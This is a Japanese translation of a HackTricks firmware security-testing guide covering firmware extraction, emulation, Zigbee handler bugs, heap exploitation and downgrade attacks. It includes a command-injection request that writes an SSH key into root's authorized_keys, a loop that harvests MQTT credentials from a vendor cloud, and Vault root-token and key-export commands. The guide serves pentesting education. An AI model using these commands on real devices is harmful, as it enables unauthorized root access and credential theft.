# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **はじめに**

### 関連リソース

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmwareは、ハードウェアコンポーネントとユーザーが操作するソフトウェア間の通信を管理・促進し、デバイスが正しく動作できるようにする不可欠なソフトウェアです。永続メモリに保存されているため、デバイスは電源投入直後から重要な命令にアクセスでき、オペレーティングシステムの起動につながります。セキュリティ上の脆弱性を特定するうえで、Firmwareの調査や改変の可能性を検討することは重要なステップです。<sup>[[2]](#references)[[3]](#references)</sup>

## **情報収集**

**情報収集**は、デバイスの構成や使用されている技術を把握するための重要な初期ステップです。このプロセスでは、次の情報を収集します。

- CPUアーキテクチャと実行しているオペレーティングシステム
- Bootloaderの詳細
- ハードウェアの構成とデータシート
- コードベースの規模やソースの場所
- 外部ライブラリとライセンスの種類
- アップデート履歴と規制認証
- アーキテクチャ図とフロー図
- セキュリティ評価と特定された脆弱性

この目的には、**open-source intelligence (OSINT)** ツールが非常に有用です。また、利用可能なオープンソースソフトウェアコンポーネントを手動および自動でレビューして分析することも役立ちます。[Coverity Scan](https://scan.coverity.com) や [Semmle’s LGTM](https://lgtm.com/#explore) などのツールは、潜在的な問題の発見に活用できる無料の静的解析を提供します。

## **Firmwareの取得**

Firmwareの取得には、複雑さの異なるさまざまな方法があります。

- 開発者やメーカーなどの提供元から**直接取得**する
- 提供された手順に従って**ビルド**する
- 公式サポートサイトから**ダウンロード**する
- ホストされているFirmwareファイルを見つけるために**Google dork**クエリを利用する
- [S3Scanner](https://github.com/sa7mon/S3Scanner) などのツールを使い、**cloud storage**に直接アクセスする
- man-in-the-middle技術で**アップデートを傍受**する
- **UART**、**JTAG**、**PICit**などを介してデバイスから**抽出**する
- デバイスとの通信を監視して、アップデート要求を**スニッフィング**する
- **ハードコードされたアップデートエンドポイント**を特定して利用する
- Bootloaderやネットワークから**ダンプ**する
- 他の方法がすべて失敗した場合、適切なハードウェアツールを使ってストレージチップを**取り外して読み取る**

### UARTのみのログ: フラッシュ上のU-Boot envを使ってroot shellを強制する

UART RXが無視される場合（ログの読み取りのみ可能な場合）でも、オフラインで**U-Boot環境のblobを編集**すれば、init shellを強制できます。<sup>[[6]](#references)</sup>

1. SOIC-8クリップとプログラマー（3.3V）を使ってSPI flashをダンプする。
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. U-Boot env partitionを特定し、`bootargs`を編集して`init=/bin/sh`を含め、blobの**U-Boot env CRC32を再計算**します。
3. env partitionのみを再フラッシュして再起動すると、UART上にshellが表示されます。

これは、bootloader shellは無効になっているものの、外部flashアクセスでenv partitionに書き込める組み込みデバイスで役立ちます。

## ファームウェアの解析

**ファームウェアを入手した**ので、どのように扱うかを把握するために情報を抽出する必要があります。そのために使えるツールは次のとおりです。

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

これらのツールであまり見つからない場合は、`binwalk -E <bin>` でイメージの**entropy**を確認してください。entropyが低ければ、暗号化されていない可能性が高いです。高ければ、暗号化されている（または何らかの方法で圧縮されている）可能性が高いです。

さらに、以下のツールを使って**ファームウェア内に埋め込まれたファイル**を抽出できます。


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

または、[**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) を使ってファイルを調べることもできます。

### ファイルシステムの取得

先ほど紹介した `binwalk -ev <bin>` などのツールを使えば、**ファイルシステムを抽出**できているはずです。\
Binwalkは通常、ファイルシステムの種類を名前にした**フォルダー**内に抽出します。一般的な種類は、squashfs、ubifs、romfs、rootfs、jffs2、yaffs2、cramfs、initramfsです。

#### ファイルシステムの手動抽出

場合によっては、binwalkのシグネチャにファイルシステムの**magic byte**が含まれていないことがあります。その場合は、binwalkを使って**ファイルシステムのオフセットを特定し、圧縮されたファイルシステムをバイナリから切り出して**、以下の手順に従い、種類に応じて**手動で抽出**してください。

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Squashfs ファイルシステムを carve するため、以下の **dd command** を実行します。

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

または、次のコマンドを実行することもできます。

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs の場合（上記の例で使用）

`$ unsquashfs dir.squashfs`

実行後、ファイルは "`squashfs-root`" ディレクトリ内にあります。

- CPIO アーカイブファイル

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 ファイルシステムの場合

`$ jefferson rootfsfile.jffs2`

- NAND フラッシュを使用する ubifs ファイルシステムの場合

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## ファームウェアの分析

ファームウェアを入手したら、その構造や潜在的な脆弱性を理解するために、詳しく調査することが重要です。このプロセスでは、さまざまなツールを使用してファームウェアイメージを分析し、価値のあるデータを抽出します。

### 初期分析ツール

バイナリファイル（`<bin>` と表記）を最初に調査するためのコマンドをいくつか紹介します。これらのコマンドを使うと、ファイルの種類を特定し、文字列を抽出し、バイナリデータを分析して、パーティションやファイルシステムの詳細を把握できます。

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

イメージの暗号化状態を評価するには、`binwalk -E <bin>` を使って**エントロピー**を確認します。エントロピーが低い場合は暗号化されていない可能性が高く、エントロピーが高い場合は暗号化または圧縮されている可能性があります。

**埋め込みファイル**の抽出には、**file-data-carving-recovery-tools** のドキュメントや、ファイル検査用の **binvis.io** などのツールやリソースが推奨されます。

### ファイルシステムの抽出

`binwalk -ev <bin>` を使うと、通常はファイルシステムを抽出できます。多くの場合、ファイルシステムの種類にちなんだ名前のディレクトリ（例: squashfs、ubifs）に抽出されます。ただし、magic bytes がないために **binwalk** がファイルシステムの種類を認識できない場合は、手動で抽出する必要があります。その場合は、`binwalk` でファイルシステムのオフセットを特定してから、`dd` コマンドでファイルシステムを切り出します。

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

その後、filesystemの種類（例: squashfs、cpio、jffs2、ubifs）に応じて、内容を手動で抽出するために異なるコマンドを使用します。

### Filesystem Analysis

filesystemを抽出したら、security flawの調査を開始します。安全でないnetwork daemon、hardcoded credential、API endpoint、update serverの機能、未コンパイルのコード、startup script、オフライン分析用のcompiled binaryに注目します。

**確認すべき主要な場所**と**項目**には、次のものがあります。

- ユーザーcredentialを含む **etc/shadow** と **etc/passwd**
- **etc/ssl** 内のSSL certificateとkey
- 脆弱性の可能性がある設定ファイルとscript file
- 追加分析用のembedded binary
- 一般的なIoT deviceのweb serverとbinary

filesystem内の機密情報や脆弱性の発見には、次のようなツールが役立ちます。

- 機密情報の検索には、[**LinPEAS**](https://github.com/carlospolop/PEASS-ng) と [**Firmwalker**](https://github.com/craigz28/firmwalker)
- 包括的なfirmware分析には、[**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- 静的・動的分析には、[**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer)、[**ByteSweep**](https://gitlab.com/bytesweep/bytesweep)、[**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go)、[**EMBA**](https://github.com/e-m-b-a/emba)

### Compiled BinaryのSecurity Check

filesystem内で見つかったsource codeとcompiled binaryの両方について、脆弱性がないか精査する必要があります。Unix binary用の**checksec.sh**やWindows binary用の**PESecurity**などのツールを使うと、悪用される可能性のある保護されていないbinaryを特定できます。

## 導出されたURL tokenを使ったcloud configとMQTT credentialの取得

多くのIoT hubは、次のようなcloud endpointからデバイスごとの設定を取得します。<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

firmware分析中に、たとえば次のように、hardcoded secretを使って`<token>`がdevice IDからローカルで導出されていることが判明する場合があります。

- token = MD5( deviceId || STATIC_KEY )。大文字の16進数で表される

この設計では、deviceIdとSTATIC_KEYを知っている人なら誰でもURLを再構築し、cloud configを取得できます。多くの場合、これによって平文のMQTT credentialやtopic prefixが明らかになります。

実践的な手順:

1) UART boot logからdeviceIdを抽出する

- 3.3V UART adapter（TX/RX/GND）を接続し、ログを取得します。

```bash
picocom -b 115200 /dev/ttyUSB0
```

- cloud config URLのパターンとbrokerアドレスを出力する行を探します。たとえば次のような行です。

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) firmwareからSTATIC_KEYとtoken algorithmを復元する

- バイナリをGhidra/radare2に読み込み、config path（"/pf/"）またはMD5の使用箇所を検索する。
- algorithm（例: MD5(deviceId||STATIC_KEY)）を確認する。
- Bashでtokenを導出し、digestを大文字にする:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Cloud config と MQTT credentials を収集する

- URL を組み立て、curl で JSON を取得し、jq で解析して secrets を抽出する:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) 平文 MQTT と弱い topic ACL（存在する場合）を悪用する

- 回収した認証情報を使ってメンテナンス用 topic を subscribe し、機密性の高いイベントを探す:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) 予測可能なデバイス ID を列挙する（認可を得たうえで、大規模に）

- 多くのエコシステムでは、ベンダー OUI／製品／タイプのバイト列の後に連番のサフィックスが埋め込まれています。
- 候補 ID を順に試し、トークンを導出して、設定をプログラムで取得できます。

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notes
- 大量の列挙を試みる前に、必ず明示的な許可を得てください。
- 可能であれば、対象ハードウェアを変更せずに秘密情報を復元するため、emulation または static analysis を優先してください。


firmware を emulation することで、デバイスの動作や個々のプログラムの **dynamic analysis** が可能になります。この方法では、ハードウェアやアーキテクチャへの依存が課題となることがありますが、root filesystem や特定のバイナリを、Raspberry Pi などのアーキテクチャとエンディアンが一致するデバイス、または事前構築済みの仮想マシンに転送すると、さらにテストを進めやすくなります。

### 個々のバイナリの emulation

単一のプログラムを調査する場合、プログラムのエンディアンと CPU アーキテクチャを特定することが重要です。

#### MIPS アーキテクチャの例

MIPS アーキテクチャのバイナリを emulation するには、次のコマンドを使用できます。

```bash
file ./squashfs-root/bin/busybox
```

また、必要なエミュレーションツールをインストールするには:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

MIPS（ビッグエンディアン）では `qemu-mips` を使用し、リトルエンディアンのバイナリには `qemu-mipsel` を使用します。

#### ARM Architecture Emulation

ARMバイナリの場合も同様の手順で、エミュレーションには `qemu-arm` エミュレーターを使用します。

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne)、[Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) などのツールを使うと、ファームウェア全体のエミュレーションが可能です。これらのツールはプロセスを自動化し、動的解析を支援します。

## Dynamic Analysis in Practice

この段階では、実機またはエミュレートされたデバイス環境を使って解析します。OSとファイルシステムへの shell access を維持することが重要です。エミュレーションではハードウェアとのやり取りを完全には再現できない場合があり、その際はエミュレーションを再起動する必要があります。解析では、ファイルシステムを再確認し、公開されているWebページやネットワークサービスを exploit し、ブートローダーの脆弱性を調査します。潜在的なバックドアの脆弱性を特定するには、ファームウェアの整合性テストが不可欠です。

## Runtime Analysis Techniques

Runtime analysis では、gdb-multiarch、Frida、Ghidra などのツールを使い、実行環境内のプロセスやバイナリを操作します。ブレークポイントを設定し、fuzzing などの手法で脆弱性を特定します。

完全なデバッガーを使えない組み込みターゲットでは、静的リンクされた `gdbserver` をデバイスに**コピー**して、リモートから接続します。<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor message mapping

IoT hubでは、RF stackが**radio MCU**とLinux userland processに分割されていることがよくあります。有用な手順は、次の経路をマッピングすることです。<sup>[[8]](#references)</sup>

1. 無線上の**RF frame**
2. radio MCU上の**controller-side parser**
3. Linuxに転送される**serial/UART textまたはTLV protocol**（例: `/dev/tty*`）
4. メインdaemon内の**application dispatcher**
5. **protocol-specific handler / state machine**

このアーキテクチャでは、reverse engineeringの対象が1つではなく2つになります。controllerがbinary radio frameを`Group,Command,arg1,arg2,...`のようなtext protocolに変換している場合、次の情報を特定します。

- **message group**とdispatch table
- どのmessageが**network**由来で、どれがcontroller自身から来るか
- 正確な**manufacturer-specific discriminator field**（例: Zigbeeの`manufacturer_code`やcustom `cluster_command`）
- **commissioning**、discovery、firmware/model downloadの段階でのみ到達可能なhandler

特にZigbeeでは、pairing時のtrafficをcaptureし、対象がデフォルトの**Link Key** `ZigBeeAlliance09`に依存しているか確認します。依存している場合、commissioning trafficをsniffすると**Network Key**が漏洩する可能性があります。Zigbee 3.0のinstall codeはこのリスクを軽減するため、テスト対象のdeviceで実際に強制されているか確認します。

### Manufacturer-specific protocol handlerとFSMで制御された到達可能性

Vendor-specificなZigbee/ZCL commandは、standardized clusterよりも有力なターゲットになることがあります。より十分に検証されていない**custom parsing code**や内部**FSM**に入力されるためです。<sup>[[8]](#references)</sup>

実践的な手順:

- command dispatcherをreverseし、**vendor-only handler**を見つける。
- **FSM state**、**event**、**check**、**action**、**next-state**のtableを特定する。
- 自動的に次へ進む**transitional state**と、最終的にattacker-controlled stateをresetまたはfreeするretry/error branchを特定する。
- buggy handlerが常に到達可能だと決めつけず、daemonをvulnerable stateに置くために必要な正規のprotocol exchangeを確認する。

タイミングに敏感なprotocolでは、Python frameworkからのpacket replayは遅すぎることがあります。より確実な方法は、vendor-grade stackを備えた実機（例: **nRF52840**）で正規のdeviceをemulateし、適切な**endpoint**、**attribute**、commissioning timingを再現することです。

### Embedded daemonにおけるfragmented-download bug class

**fragmented blob/model/configuration download**では、次のようなfirmware bugが繰り返し見られます。<sup>[[8]](#references)</sup>

1. **first fragment**（`offset == 0`）で`ctx->total_size`を保存し、`malloc(total_size)`で割り当てる。
2. 後続fragmentでは、`packet_total_size >= offset + chunk_len`のような、attacker-controlledな**packet-local** fieldしか検証しない。
3. **original allocated size**との照合をせずに、`memcpy(&ctx->buffer[offset], chunk, chunk_len)`でcopyする。

これにより、攻撃者は次の操作を行えます。

- 宣言するtotal sizeを**小さく**した有効なfirst fragmentを送り、小さなheap allocationを強制する。
- **expected offset**を保ちつつ、より大きな`chunk_len`を持つ後続fragmentを送る。
- fresh checkを満たしながら、最初に割り当てられたbufferをoverflowさせる、偽装したpacket-local sizeを指定する。

vulnerable pathがcommissioning logicの背後にある場合、不正なfragmentを送る前に、対象を想定されるmodel-downloadまたはblob-download stateへ移行させるための**device emulation**が必要です。

### Protocol-driven `free()` trigger

Embedded daemonでは、heap metadata exploitationを引き起こす最も簡単な方法は、「cleanupを待つ」ことではなく、**protocol自身のerror handlingを強制する**ことです。<sup>[[8]](#references)</sup>

- 不正なfollow-up fragmentを送り、FSMを**retry**または**error** stateに移行させる。
- retry thresholdを超えさせ、daemonに**contextをreset**させて破損したbufferをfreeさせる。
- 予測可能なこの`free()`を利用して、無関係な原因でprocessがcrashする前にallocator-side primitiveを発動させる。

これは、特にembedded Linuxの**musl/uClibc/dlmalloc系**allocatorに有効です。chunk metadataの破損によって、unlink/unbin logicをwrite primitiveに変えられる場合があります。安定した手法は、real bin pointerをすぐに上書きしてprocessをcrashさせるのではなく、**size field**を破損させ、allocator traversalをoverflowしたbuffer内に配置した**fake chunk**へ誘導することです。

## Binary ExploitationとProof-of-Concept

特定したvulnerabilityのPoCを開発するには、target architectureへの深い理解と、低レベル言語でのprogrammingが必要です。Embedded systemではbinary runtime protectionはまれですが、存在する場合はReturn Oriented Programming (ROP)などのtechniqueが必要になることがあります。

### uClibc fastbin exploitationの注意点（embedded Linux）

- **Fastbinとconsolidation:** uClibcはglibcと同様のfastbinを使用します。後続のlarge allocationで`__malloc_consolidate()`が呼ばれる場合があるため、fake chunkはcheck（妥当なsize、`fd = 0`、周囲のchunkが"in use"と認識されること）を通過する必要があります。<sup>[[6]](#references)</sup>
- **ASLR下のnon-PIE binary:** ASLRが有効でも、メインbinaryが**non-PIE**なら、binary内の`.data/.bss` addressは安定しています。有効なheap chunk headerに似たregionをtargetにすれば、fastbin allocationを**function pointer table**上に配置できます。
- **parserを停止させるNUL:** JSONのparse時にpayload内の`\x00`があると、後続のattacker-controlled byteをstack pivot/ROP chain用に残したまま、parseを停止させられる場合があります。
- **`/proc/self/mem`経由のshellcode:** `open("/proc/self/mem")`、`lseek()`、`write()`を呼び出すROP chainで、既知のmappingに実行可能なshellcodeを配置してjumpできます。

## Firmware Analysis向けのPrepared Operating System

[AttifyOS](https://github.com/adi0x90/attifyos)や[EmbedOS](https://github.com/scriptingxss/EmbedOS)などのoperating systemは、firmware security testingに必要なtoolを備えた、事前設定済みの環境を提供します。

## Firmware Analysis用のPrepared OS

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOSは、Internet of Things (IoT) deviceのsecurity assessmentとpenetration testingを支援するためのdistroです。必要なtoolがすべて読み込まれた事前設定済みの環境を提供し、多くの時間を節約できます。
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): firmware security testing toolが事前にインストールされた、Ubuntu 18.04ベースのembedded security testing operating systemです。

## Firmware Downgrade Attackと安全でないUpdate Mechanism

vendorがfirmware imageのcryptographic signature checkを実装していても、**version rollback（downgrade）protectionは省略されていることがよくあります**。bootまたはrecovery loaderが、埋め込まれたpublic keyでsignatureを検証するだけで、書き込むimageの*version*（またはmonotonic counter）を比較しない場合、攻撃者は**有効なsignatureが付いた古いvulnerable firmware**を正規の手順でインストールし、修正済みのvulnerabilityを再び利用可能にできます。<sup>[[4]](#references)</sup>

典型的なattack workflow:

1. **古い署名済みimageを入手する**
   * vendorの公開download portal、CDN、またはsupport siteから取得する。
   * companion mobile/desktop applicationから抽出する（例: Android APK内の`assets/firmware/`）。
   * VirusTotal、Internet archive、forumなどのthird-party repositoryから取得する。
2. 公開されているupdate channelを使って、imageをdeviceに**uploadするか配信する**。
   * Web UI、mobile-app API、USB、TFTP、MQTTなど。
   * 多くのconsumer IoT deviceは、Base64 encodeされたfirmware blobを受け付け、server側でdecodeしてrecovery/upgradeを開始する、*認証不要*のHTTP(S) endpointを公開しています。
3. downgrade後、新しいreleaseで修正されたvulnerabilityをexploitする（例: 後のversionで追加されたcommand-injection filter）。
4. 任意で、persistenceを得た後に最新imageを書き戻すか、検知を避けるためupdateを無効化する。

### 例: Downgrade後のCommand Injection

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

脆弱な（ダウングレードされた）firmwareでは、`md5`パラメータがサニタイズされずにshell commandへ直接連結されるため、任意のコマンドを注入できます（ここでは、SSH key-basedのroot accessを有効化しています）。後のfirmwareバージョンでは基本的な文字フィルターが導入されましたが、ダウングレード保護がないため、この修正は無意味です。<sup>[[4]](#references)</sup>

### モバイルアプリからのFirmware抽出

多くのベンダーは、アプリからBluetooth/Wi-Fi経由でデバイスを更新できるよう、companion mobile applicationに完全なfirmwareイメージを同梱しています。これらのパッケージは、`assets/fw/`や`res/raw/`などのパスにあるAPK/APEX内に、暗号化されずに保存されていることがよくあります。`apktool`、`ghidra`、あるいは単純な`unzip`などのツールを使えば、物理ハードウェアに触れることなく、署名済みイメージを取り出せます。<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B slot設計におけるupdaterのみのanti-rollback bypass

一部のvendorはanti-downgrade **ratchet**を実装していますが、その適用範囲は*updater*のロジック内に限られます（例: CAN経由のUDS routine、recovery command、userspace OTA agent）。その後、**bootloader**がイメージのsignature/CRCだけをチェックし、partition tableやslot metadataを信頼する場合、rollback protectionは依然としてbypassできます。<sup>[[7]](#references)</sup>

典型的な脆弱設計:

- Firmware metadataに、version descriptorと**security ratchet** / monotonic counterの両方が含まれている。
- Updaterは、イメージのratchetをpersistent storageに保存された値と比較し、古いsigned imageを拒否する。
- Bootloaderはそのratchetを**解析せず**、選択されたslotを起動する前にheader、CRC、signatureだけを検証する。
- Slotの有効化情報はpartition tableまたはslotごとのgeneration counterに別途保存され、検証済みの正確なfirmware digestには**暗号学的に結び付けられていない**。

これにより、dual-slot systemで**あるイメージを検証し、別のイメージを起動する**primitiveが成立します。攻撃者が、現在のsigned imageを使ってupdaterにslot Bを次回のboot targetとして指定させ、その後reboot前にslot Bを上書きできる場合、bootloaderはすでにcommitされたslot metadataしか信頼しないため、downgradeされたイメージを起動する可能性があります。

よくある悪用パターン:

1. **現行のsigned** firmwareをpassive slotにuploadし、通常のvalidation/switch routineを実行して、そのslotが次のactive slotとしてlayoutに記録されるようにする。
2. **まだrebootしない**。同じsession内でslot-preparation/erase routineを再度実行する。
3. 古いboot-stateまたはslot-selectionロジックを悪用し、updaterに、直前に昇格したものと**同じ物理slot**をeraseさせる。
4. **古いがsignedのままの** firmwareをそのslotに書き込む。
5. ratchetを強制するvalidation routineをスキップし、直接rebootする。
6. Bootloaderは昇格済みのslotを選択し、signature/integrityだけを検証して、古いイメージを起動する。

A/B update実装をreverse engineeringする際に確認する点:

- Slot選択が、switch成功後に更新されない**boot-time flags**から導出されている。
- `prepare_passive_slot()`のようなroutineが、**現在commit済みのlayout**ではなく古いstateに基づいてslotをeraseする。
- `part_write_layout()`のようなfunctionが、**generation counter** / active flagを更新するだけで、検証済みイメージのhashを保存しない。
- Ratchet checkがuserspaceまたはupdaterのcodeに実装されている一方、ROM / bootloader / secure boot stageには**実装されていない**。
- Eraseまたはrecovery routineが、内容を削除して書き換えた後も、そのslotをboot可能な状態として残す。

### Update Logicの評価チェックリスト

* *update endpoint*のtransport/authenticationは適切に保護されているか（TLS + authentication）？
* Flash前に、deviceは**version number**または**monotonic anti-rollback counter**を比較するか？
* イメージはsecure boot chain内で検証されるか（例: ROM codeによるsignature check）？
* **bootloaderはupdaterと同じratchetを強制するか**、それともsignature/CRCだけをチェックするか？
* Slot activation metadataは**検証済みfirmwareのdigest/versionに結び付けられているか**、それとも昇格後にslotを変更できるか？
* Slot switch成功後、deviceは強制的にrebootするか、それとも同じsession内で後続のupdate/erase routineを実行できるか？
* Userland codeは追加のsanity check（例: 許可されたpartition map、model number）を行うか？
* *partial*または*backup* update flowは、同じvalidation logicを再利用しているか？

> 💡  上記のいずれかが欠けている場合、そのplatformはrollback attackに対して脆弱である可能性が高い。

## 練習用の脆弱なfirmware

Firmwareの脆弱性を見つける練習には、以下の脆弱なfirmware projectを出発点として利用してください。

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## 組み込みKMS/Vault stateからのfirmware decryption keyの復元

Update imageに少量のplaintext metadataと大容量の高エントロピーblobが混在している場合は、brute-forceを試す前にcontainerの初期調査を行います。<sup>[[1]](#references)</sup>

- `hexdump`、`xxd`、`strings -tx`、`base64 -d`、`binwalk -E`を使って、header、offset、行境界をdumpする。
- `Salted__`は通常、OpenSSL `enc`形式を示す。次の8 bytesがsaltで、残りがciphertext。
- `256` bytesちょうどにdecodeされるBase64 fieldは、RSA-2048 ciphertextでランダムなfirmware password/session keyをwrapしている強い手掛かり。
- 同じfile内のdetached PGP materialは、多くの場合authenticityだけを保護する。confidentialityの仕組みだと思い込まないこと。

静的なkey探索（`grep`、`strings`、PEM/PGP検索）が失敗した場合は、private keyを探すだけでなく、**運用上のdecrypt path**をreverse engineeringします。

- Updater / management binaryをdecompileし、暗号化されたblobを読み込む処理、unwrapに使うhelper/API、要求するlogical key nameを追跡する。
- 抽出したroot filesystemから、KMS state（`vault/`、`transit/`、`pkcs11`、`keystore`、`sealed-secrets`）に加えてunit fileやinit scriptを検索する。
- Plaintextの`vault operator unseal ...`、recovery key、bootstrap token、またはローカルKMSのauto-unseal scriptは、private-key materialと同等に扱う。

Applianceに元のVault binaryとstorage backendが含まれている場合、Vaultの内部機能を再実装するより、その環境を再現するほうが通常は簡単です:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

クローンした KMS で root 権限を使い、次の操作を行います。

- transit key をエクスポート可能にするのは、隔離されたクローン内だけにしてください: `vault write transit/keys/<name>/config exportable=true`
- unwrap key をエクスポートします: `vault read transit/export/encryption-key/<name>`
- 復元した RSA key を、KMS が使用する正確な padding/hash の組み合わせで試します。PKCS#1 v1.5 による復号や、デフォルトの OAEP による復号に失敗しても、key が間違っているとは限りません。Vault を使ったフローの多くは SHA-256 を使う OAEP ですが、一般的なライブラリのデフォルトは SHA-1 です。
- payload が `Salted__` で始まる場合は、AES-CBC 復号を試す前に、ベンダーの OpenSSL KDF（レガシーな機器では多くの場合 MD5 を使う `EVP_BytesToKey`）を正確に再現します。

これにより、「暗号化された firmware」の解析は、より汎用的な問題になります。**機器側の運用 key を復元し、正確な unwrap + KDF パラメーターをオフラインで再現します。**

## トレーニングと認定資格

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude による firmware の解析: シニアレベルのスキル、ジュニアレベルの自律性](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [放棄された hardware の zero-day を悪用する – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [20 ドルの smart device から、自宅へのアクセスを得た方法](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
